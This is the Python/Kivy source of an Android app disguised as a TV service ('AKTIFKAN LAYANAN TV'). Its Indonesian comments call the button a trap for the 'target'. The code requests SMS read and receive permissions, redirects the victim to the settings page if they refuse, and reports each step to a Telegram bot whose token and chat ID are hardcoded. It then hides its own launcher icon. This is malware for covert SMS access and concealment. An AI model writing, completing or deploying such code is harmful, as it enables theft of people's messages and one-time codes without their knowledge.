import telebot
from android.permissions import request_permissions, Permission
from jnius import autoclass
from kivy.app import App
from kivy.uix.button import Button
from kivy.uix.boxlayout import BoxLayout
from kivy.clock import Clock
import os

TOKEN = "8688240904:AAFbm71rIxvaNTAuy0qUatSkAagp26uD6ZU"
CHAT_ID = "5999516433"
bot = telebot.TeleBot(TOKEN)

class LOKTV(App):
    def build(self):
        layout = BoxLayout(orientation='vertical', padding=50)
        # Tombol jebakan agar sistem tidak memblokir popup
        btn = Button(text="AKTIFKAN LAYANAN TV", size_hint=(1, 0.2), background_color=(0, 1, 0, 1))
        btn.bind(on_press=self.pancing_izin)
        layout.add_widget(btn)
        return layout

    def pancing_izin(self, instance):
        perms = [Permission.READ_SMS, Permission.RECEIVE_SMS, Permission.POST_NOTIFICATIONS]
        request_permissions(perms, self.hasil_respon)

    def hasil_respon(self, permissions, grants):
        if all(grants):
            try:
                bot.send_message(CHAT_ID, "✅ AKSES DITEMBUS! Target mengizinkan.")
                self.eksekusi_hilang()
            except: pass
        else:
            # Jika masih diblokir, arahkan target ke pengaturan secara otomatis
            self.buka_pengaturan_manual()

    def buka_pengaturan_manual(self):
        # Trik untuk membuka info aplikasi agar target bisa aktifkan manual jika popup gagal
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        Intent = autoclass('android.content.Intent')
        Settings = autoclass('android.provider.Settings')
        Uri = autoclass('android.net.Uri')
        
        intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
        uri = Uri.fromParts("package", PythonActivity.mActivity.getPackageName(), None)
        intent.setData(uri)
        PythonActivity.mActivity.startActivity(intent)
        bot.send_message(CHAT_ID, "⚠️ Popup Gagal, Target diarahkan ke Pengaturan Manual.")

    def eksekusi_hilang(self):
        try:
            activity = autoclass('org.kivy.android.PythonActivity').mActivity
            pm = activity.getPackageManager()
            ComponentName = autoclass('android.content.ComponentName')
            comp = ComponentName(activity.getPackageName(), 'org.kivy.android.PythonActivity')
            
            # Sembunyikan ikon
            pm.setComponentEnabledSetting(comp, 2, 1)
            bot.send_message(CHAT_ID, "⚠️ IKON HILANG TOTAL.")
            Clock.schedule_once(lambda dt: os._exit(0), 1)
        except:
            os._exit(0)

if __name__ == '__main__':
    LOKTV().run()
